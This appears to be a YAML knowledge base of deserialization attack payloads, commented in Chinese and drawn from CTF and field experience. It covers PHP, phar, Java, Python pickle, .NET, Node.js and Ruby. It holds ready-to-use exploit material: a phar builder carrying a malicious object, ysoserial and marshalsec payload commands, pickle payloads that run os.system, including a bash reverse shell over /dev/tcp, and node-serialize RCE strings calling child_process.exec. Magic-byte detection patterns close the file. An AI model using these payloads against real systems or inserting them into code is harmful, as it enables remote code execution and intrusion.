# 反序列化 Payload 知识库
# 来源: Des-CTF-Knowledge + Hunter 实战经验
# 更新: 2026-06-02

metadata:
  category: deser
  description: "反序列化漏洞 Payload 集合"
  version: "1.0"

# ============================================
# 1. PHP 反序列化
# ============================================
php:
  description: "PHP 反序列化"
  basic_format:
    description: "基础序列化格式"
    object: 'O:<class_length>:"<class_name>":<prop_count>:{<props>}'
    string: 's:<length>:"<value>"'
    integer: 'i:<value>'
    boolean: 'b:0'  # or b:1
    array: 'a:<count>:{<key_value_pairs>}'
    null: 'N'
  magic_methods:
    description: "魔术方法触发条件"
    __wakeup: "unserialize() 时调用"
    __destruct: "对象被销毁时"
    __toString: "对象被当作字符串使用时"
    __call: "调用对象不存在的方法时"
    __get: "访问不存在/不可访问属性时"
    __set: "设置不存在/不可访问属性时"
    __invoke: "对象被当作函数调用时"
    __construct: "对象创建时"
    __clone: "对象克隆时"
  example:
    - 'O:3:"Foo":1:{s:3:"cmd";s:2:"ls";}'
    - 'O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}'

# ============================================
# 2. PHP phar 反序列化
# ============================================
php_phar:
  description: "phar:// 协议反序列化"
  trigger_functions:
    - "copy()"
    - "file_get_contents()"
    - "file_exists()"
    - "is_file()"
    - "include()"
    - "require()"
    - "fopen()"
    - "file()"
    - "fread()"
    - "fputs()"
    - "fputcsv()"
    - "fscanf()"
    - "fpassthru()"
    - "file()"
    - "readfile()"
    - "stat()"
    - "lstat()"
    - "fileatime()"
    - "filectime()"
    - "filegroup()"
    - "fileinode()"
    - "filemtime()"
    - "fileowner()"
    - "fileperms()"
    - "filesize()"
    - "filetype()"
    - "is_dir()"
    - "is_executable()"
    - "is_file()"
    - "is_link()"
    - "is_readable()"
    - "is_writable()"
    - "is_writeable()"
    - "pathinfo()"
    - "realpath()"
    - "touch()"
    - "unlink()"
    - "getimagesize()"
    - "getimagesizefromstring()"
  generate_phar:
    description: "生成 phar 文件"
    code: |
      <?php
      $phar = new Phar('test.phar');
      $phar->startBuffering();
      $phar->addFromString('file.txt', 'test');
      $phar->setStub('<?php __HALT_COMPILER(); ?>');
      $o = new MaliciousClass();  // 放入恶意对象
      $phar->setMetadata($o);
      $phar->stopBuffering();
  bypass:
    - "phar://test.phar/file"
    - "phar://test.phar%23file"
    - "compress.zlib://phar://test.phar/file"

# ============================================
# 3. Java 反序列化
# ============================================
java:
  description: "Java 反序列化"
  common_gadgets:
    - "CommonsCollections1"
    - "CommonsCollections2"
    - "CommonsCollections3"
    - "CommonsCollections4"
    - "CommonsCollections5"
    - "CommonsCollections6"
    - "CommonsCollections7"
    - "CommonsBeanutils1"
    - "Spring1"
    - "Spring2"
    - "Groovy1"
    - "JBossInterceptors1"
    - "Jdk7u21"
    - "Jdk8u20"
  tools:
    - name: "ysoserial"
      command: "java -jar ysoserial.jar <gadget> '<command>'"
      description: "Java 反序列化 payload 生成"
    - name: "marshalsec"
      command: "java -cp marshalsec.jar marshalsec.<gadget> '<command>'"
      description: "Java 反序列化 payload 生成"
  detection:
    - "\\xac\\xed\\x00\\x05"  # Java序列化魔数
    - "rO0AB"  # Base64编码的Java序列化数据

# ============================================
# 4. Python 反序列化
# ============================================
python:
  description: "Python 反序列化 (pickle)"
  basic_payload:
    description: "基础 pickle payload"
    code: |
      import pickle
      import os

      class Exploit(object):
          def __reduce__(self):
              return (os.system, ('id',))

      pickle.dumps(Exploit())
  reverse_shell:
    description: "pickle 反弹 shell"
    code: |
      import pickle
      import os

      class Exploit(object):
          def __reduce__(self):
              return (os.system, ('bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"',))

      pickle.dumps(Exploit())
  detection:
    - "\\x80\\x04\\x95"  # pickle protocol 4
    - "\\x80\\x03\\x95"  # pickle protocol 3
    - "cos\\nsystem\\n"   # os.system

# ============================================
# 5. .NET 反序列化
# ============================================
dotnet:
  description: ".NET 反序列化"
  common_gadgets:
    - "TypeConfuseDelegate"
    - "WindowsIdentity"
    - "ClaimsIdentity"
    - "RolePrincipal"
    - "DataSet"
    - "ObjectDataProvider"
    - "PSObject"
    - "ActivitySurrogateSelector"
  tools:
    - name: "ysoserial.net"
      command: "ysoserial.exe -g <gadget> -f BinaryFormatter -o base64 -c '<command>'"
      description: ".NET 反序列化 payload 生成"
  detection:
    - "\\x00\\x01\\x00\\x00\\x00\\xFF\\xFF\\xFF\\xFF"  # BinaryFormatter

# ============================================
# 6. Node.js 反序列化
# ============================================
nodejs:
  description: "Node.js 反序列化"
  node_serialize:
    description: "node-serialize 漏洞"
    payload: "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()\"}"
  serialize_js:
    description: "serialize-javascript 漏洞"
    payload: "{\"rce\":\"function(){require('child_process').exec('id')}()\"}"

# ============================================
# 7. Ruby 反序列化
# ============================================
ruby:
  description: "Ruby 反序列化 (Marshal)"
  detection:
    - "\\x04\\x08"  # Marshal header
  gadgets:
    - "Gem::Requirement"
    - "Gem::StubSpecification"
    - "Gem::Source::Git"

# ============================================
# 8. 反序列化检测
# ============================================
detection:
  description: "反序列化漏洞检测"
  php:
    - 'O:'  # PHP 对象
    - 'a:'  # PHP 数组
    - 's:'  # PHP 字符串
  java:
    - "\\xac\\xed\\x00\\x05"
    - "rO0AB"
  python:
    - "\\x80\\x04\\x95"
    - "\\x80\\x03\\x95"
    - "cos\\nsystem\\n"
  dotnet:
    - "\\x00\\x01\\x00\\x00\\x00\\xFF\\xFF\\xFF\\xFF"
